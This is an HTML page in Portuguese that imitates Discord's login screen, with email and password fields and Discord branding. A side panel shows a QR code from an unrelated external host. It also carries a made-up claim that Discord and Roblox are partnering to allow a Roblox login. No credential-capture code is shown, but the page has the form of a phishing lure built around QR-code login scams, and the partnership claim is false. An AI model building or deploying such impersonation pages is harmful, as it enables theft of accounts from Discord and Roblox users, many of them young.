<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Discord - Entrar</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
      background: url('https://vulplex.com/images/featured/Minimalist-Discord-Logo-Wallpaper-on-Soothing-Blue-Background-66deda7fadf4d.jpg') no-repeat center center fixed;
      background-size: cover;
      color: #fff;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      position: relative;
    }
    body::after {
      content: "";
      position: absolute;
      inset: 0;
      background: rgba(0, 0, 0, 0.35);
      pointer-events: none;
      z-index: 1;
    }
    .container {
      display: flex;
      width: 90%;
      max-width: 1100px;
      height: 85vh;
      max-height: 700px;
      background: rgba(30, 30, 50, 0.75);
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 10px 40px rgba(0,0,0,0.6);
      backdrop-filter: blur(10px);
      position: relative;
      z-index: 2;
    }
    .left {
      flex: 1;
      padding: 60px 80px;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }
    .right {
      flex: 1;
      background: rgba(54, 57, 63, 0.9);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 40px;
    }
    h1 {
      font-size: 2.2rem;
      margin-bottom: 8px;
      text-align: center;
    }
    p.subtitle {
      color: #b9bbbe;
      text-align: center;
      margin-bottom: 40px;
      font-size: 1.1rem;
    }
    label {
      display: block;
      margin-bottom: 8px;
      font-size: 0.9rem;
      color: #b9bbbe;
      font-weight: 600;
    }
    input {
      width: 100%;
      padding: 14px;
      margin-bottom: 12px; /* reduzido um pouco pra caber o link logo abaixo */
      background: #202225;
      border: 1px solid #2f3136;
      border-radius: 4px;
      color: white;
      font-size: 1rem;
      outline: none;
    }
    input:focus {
      border-color: #5865f2;
      box-shadow: 0 0 0 2px rgba(88,101,242,0.3);
    }
    .forgot-link {
      color: #00aff4;
      font-size: 0.9rem;
      text-decoration: none;
      display: block;
      margin-bottom: 24px;
      text-align: left; /* alinhado à ESQUERDA como pedido */
    }
    .forgot-link:hover {
      text-decoration: underline;
    }
    button {
      width: 100%;
      padding: 14px;
      background: #5865f2;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 1.1rem;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
      margin-bottom: 16px; /* espaço antes do texto final */
    }
    button:hover {
      background: #4752c4;
    }
    .register-link {
      text-align: center;
      font-size: 0.95rem;
      color: #b9bbbe;
    }
    .register-link a {
      color: #00aff4;
      text-decoration: none;
      font-weight: 600;
    }
    .register-link a:hover {
      text-decoration: underline;
    }
    .qr-section {
      text-align: center;
      color: white;
      max-width: 320px;
    }
    .qr-image {
      width: 240px;
      height: 240px;
      margin: 20px auto 16px;
      border-radius: 12px;
      box-shadow: 0 8px 30px rgba(0,0,0,0.5);
      background: white;
      padding: 10px;
      object-fit: contain;
    }
    .qr-title {
      font-size: 1.4rem;
      font-weight: 700;
      margin-bottom: 16px;
    }
    .qr-custom-text {
      font-size: 1.1rem;
      font-weight: 600;
      line-height: 1.4;
      margin: 0 0 20px 0;
    }
    .logos {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
    }
    .logos img {
      height: 50px;
      width: auto;
      object-fit: contain;
    }
    .voltar {
      position: absolute;
      top: 20px;
      left: 20px;
      color: #00aff4;
      text-decoration: none;
      font-weight: bold;
      z-index: 3;
    }
    @media (max-width: 900px) {
      .container { flex-direction: column; height: auto; }
      .right { padding: 60px 20px; }
      .left { padding: 40px 30px; }
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="left">
      <a href="#" class="voltar">&lt; Voltar</a>
      
      <h1>Boas-vindas de volta!</h1>
      <p class="subtitle">Estamos muito animados em te ver novamente!</p>
      
      <form>
        <label for="email">E-mail ou número de telefone *</label>
        <input type="text" id="email" placeholder="" required />
        
        <label for="senha">Senha *</label>
        <input type="password" id="senha" placeholder="" required />
        
        <a href="#" class="forgot-link">Esqueceu sua senha?</a>
        
        <button type="submit">Entrar</button>
        
        <div class="register-link">
          Precisando de uma conta? <a href="#">Registre-se</a>
        </div>
      </form>
    </div>
    
    <div class="right">
      <div class="qr-section">
        <img class="qr-image" src="https://result.ghiblivideo.ai/output/result/202602/22/260d087ebb2a4245a2a0e28c0b9ddb9d.png" alt="QR customizado" />
        
        <div class="qr-title">Entrar com código QR</div>
        
        <p class="qr-custom-text">
          Ou faça login pelo roblox!!<br>
          Estamos fazendo parceria em troca de divulgação!!
        </p>
        
        <div class="logos">
          <img src="https://upload.wikimedia.org/wikipedia/commons/7/7c/Discord-logo-icon.jpg" alt="Discord Logo">
          <span style="font-size: 1.8rem; font-weight: bold;"> - </span>
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Roblox_%282025%29_%28App_Icon%29.svg/960px-Roblox_%282025%29_%28App_Icon%29.svg.png" alt="Roblox Logo">
        </div>
      </div>
    </div>
  </div>

</body>
</html>
